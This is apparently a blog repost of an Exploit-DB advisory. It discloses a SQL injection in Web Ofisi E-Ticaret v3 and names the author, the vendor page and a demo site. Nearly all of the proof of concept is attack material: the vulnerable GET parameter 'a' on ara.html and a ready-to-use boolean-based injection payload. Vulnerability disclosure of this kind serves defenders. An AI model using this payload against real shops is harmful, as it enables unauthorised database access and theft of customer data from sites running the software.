---
layout:     post
title:      "Web Ofisi E-Ticaret 3 - 'a' SQL Injection"
date:       2019-07-19 12:00
author:     "Ahmet Ümit BAYRAM"
category:   exploit
tags:       [sql, sqli, sql injection, exploit-db]
---

# Exploit Title: Web Ofisi E-Ticaret 3 - 'a' SQL Injection
# Date: 2019-07-19
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor: https://www.web-ofisi.com/detay/e-ticaret-v3-sanal-pos.html
# Demo Site: http://demobul.net/eticaretv3/
# Version: v3
# Tested on: Kali Linux
# CVE: N/A

----- PoC: SQLi -----

Request: http://localhost/[PATH]/ara.html?a=
Vulnerable Parameter: a (GET)
Payload: e%' AND 3*2*1=6 AND '0002ZIf'!='0002ZIf%
